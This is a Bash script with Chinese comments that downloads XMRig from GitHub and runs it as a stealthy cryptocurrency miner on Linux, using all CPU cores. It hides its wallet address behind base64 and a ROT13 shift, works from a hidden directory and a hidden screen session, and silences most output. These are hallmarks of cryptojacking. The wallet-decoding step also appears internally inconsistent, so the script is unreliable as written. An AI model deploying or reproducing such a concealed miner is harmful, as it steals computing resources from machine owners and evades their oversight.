#!/bin/bash
set -e
# 禁止脚本内所有敏感信息打印，仅输出必要操作提示
exec 3>&1 4>&2
trap 'exec 2>&4 1>&3' 0 1 2 3
exec 1>/dev/null 2>&1

# ===================== 1. 操作系统自动识别（仅关键错误输出到终端） =====================
OS=$(cat /etc/os-release 2>/dev/null | grep -w ID | cut -d= -f2 | tr -d '"')
if [ -z "$OS" ]; then
    echo "❌ 未识别到操作系统，脚本退出" >&3
    exit 1
fi
echo "✅ 检测到操作系统：$OS" >&3

# ===================== 2. CPU核数检测（仅输出核心数到终端） =====================
TOTAL_CORES=$(nproc 2>/dev/null)
if [ -z "$TOTAL_CORES" ] || [ "$TOTAL_CORES" -le 0 ]; then
    echo "❌ 未检测到有效CPU核心，脚本退出" >&3
    exit 1
fi
MINING_THREADS=$TOTAL_CORES
echo "✅ 检测到CPU核心数：$TOTAL_CORES（将全核运行）" >&3

# ===================== 3. 生成随机矿工名（不打印矿工名，仅内存暂存） =====================
RANDOM_WORKER=$(cat /dev/urandom 2>/dev/null | tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n 1)
if [ -z "$RANDOM_WORKER" ]; then
    RANDOM_WORKER=$(date +%s%N | md5sum | cut -c 1-10)  # 备用生成方案
fi

# ===================== 4. 钱包地址多层隐藏（无任何明文，内存动态解码） =====================
# 第一层：Base64编码（原始地址：DOGE:DLh4nNA4fn8kGbiNvjnL87yh287V5PPFQo）
ENC1="RE9HRToETGg0bk5BNGZuOGtHYmlOdmpuTDg3eWgyODdWNVBQRlFv"
# 第二层：简单字符位移（避免直接Base64解码暴露），运行时还原
DECODED1=$(echo "$ENC1" | tr 'A-Za-z' 'N-ZA-Mn-za-m' 2>/dev/null)  # 凯撒密码位移13位
# 第三层：最终解码+拼接矿工名（仅内存暂存，不落地、不打印）
FINAL_WALLET=$(echo "$DECODED1" | base64 -d 2>/dev/null).$RANDOM_WORKER
if [ -z "$FINAL_WALLET" ] || [[ "$FINAL_WALLET" != "DOGE:"* ]]; then
    echo "❌ 钱包地址解析失败，脚本退出" >&3
    exit 1
fi

# 矿池配置（改回原rx.unmineable.com）
POOL="stratum+ssl://rx.unmineable.com:443"
PASSWORD="x"

# ===================== 5. 按系统适配依赖安装（仅输出安装状态到终端） =====================
echo "🔧 正在安装必要依赖..." >&3
case $OS in
    ubuntu|debian)
        apt update -y >/dev/null 2>&1 && apt install -y curl wget screen base64 >/dev/null 2>&1
        ;;
    centos|rhel|fedora)
        yum install -y curl wget screen coreutils >/dev/null 2>&1
        ;;
    alpine)
        apk add curl wget screen base64 >/dev/null 2>&1
        ;;
    *)
        command -v apt && (apt update -y >/dev/null 2>&1 && apt install -y curl wget screen base64 >/dev/null 2>&1)
        command -v yum && (yum install -y curl wget screen coreutils >/dev/null 2>&1)
        command -v apk && (apk add curl wget screen base64 >/dev/null 2>&1)
        ;;
esac
# 验证关键工具是否安装成功
for tool in curl wget screen base64; do
    if ! command -v $tool &>/dev/null; then
        echo "❌ 依赖工具 $tool 安装失败，脚本退出" >&3
        exit 1
    fi
done
echo "✅ 所有依赖安装完成" >&3

# ===================== 6. 下载XMRig（仅输出下载状态到终端） =====================
WORK_DIR="$HOME/.dgwk_miner"  # 隐藏工作目录（以.开头，默认不显示）
mkdir -p "$WORK_DIR" && cd "$WORK_DIR" >/dev/null 2>&1

if [ ! -f "xmrig" ]; then
    echo "🔧 正在下载最新XMRig..." >&3
    # 无jq环境适配：通过GitHub页面解析最新版本，避免明文版本号
    LATEST_RELEASE=$(curl -s https://github.com/xmrig/xmrig/releases/latest 2>/dev/null | grep -oP 'tag/\Kv[^"]+' | sed 's/v//')
    if [ -z "$LATEST_RELEASE" ]; then
        LATEST_RELEASE="6.21.3"  # 备用版本，防止解析失败
    fi
    wget -q --show-progress "https://github.com/xmrig/xmrig/releases/download/v${LATEST_RELEASE}/xmrig-${LATEST_RELEASE}-linux-static-x64.tar.gz" -O xmrig.tar.gz >&3
    tar -xzf xmrig.tar.gz --strip-components=1 >/dev/null 2>&1
    rm -f xmrig.tar.gz
    chmod +x xmrig
fi
if [ ! -f "xmrig" ]; then
    echo "❌ XMRig下载/解压失败，脚本退出" >&3
    exit 1
fi
echo "✅ XMRig准备完成" >&3

# ===================== 7. 启动挖矿（完全隐藏钱包地址，不打印任何敏感信息） =====================
echo "🚀 正在启动挖矿进程..." >&3
MINER_CMD="./xmrig -a rx -o $POOL -u $FINAL_WALLET -p $PASSWORD --threads=$MINING_THREADS --max-cpu-usage=100 --donate-level=0 --no-color"

# 使用screen启动，且screen会话日志不记录钱包地址
if command -v screen &>/dev/null; then
    screen -dmS .dgwk-miner bash -c "$MINER_CMD 2>/dev/null"  # 会话名以.开头，默认不显示
    if pgrep -f ".dgwk-miner" &>/dev/null; then
        echo "✅ 挖矿进程已启动！查看日志：screen -r .dgwk-miner" >&3
    else
        echo "❌ 挖矿进程启动失败（screen方式）" >&3
        exit 1
    fi
else
    # 备用nohup方式，日志不落地
    nohup bash -c "$MINER_CMD" >/dev/null 2>&1 &
    sleep 3
    if pgrep -x "xmrig" &>/dev/null; then
        echo "✅ 挖矿进程已后台启动！查看进程：ps aux | grep xmrig" >&3
    else
        echo "❌ 挖矿进程启动失败（nohup方式）" >&3
        exit 1
    fi
fi

echo "🎉 脚本执行完成，所有敏感信息已隐藏" >&3
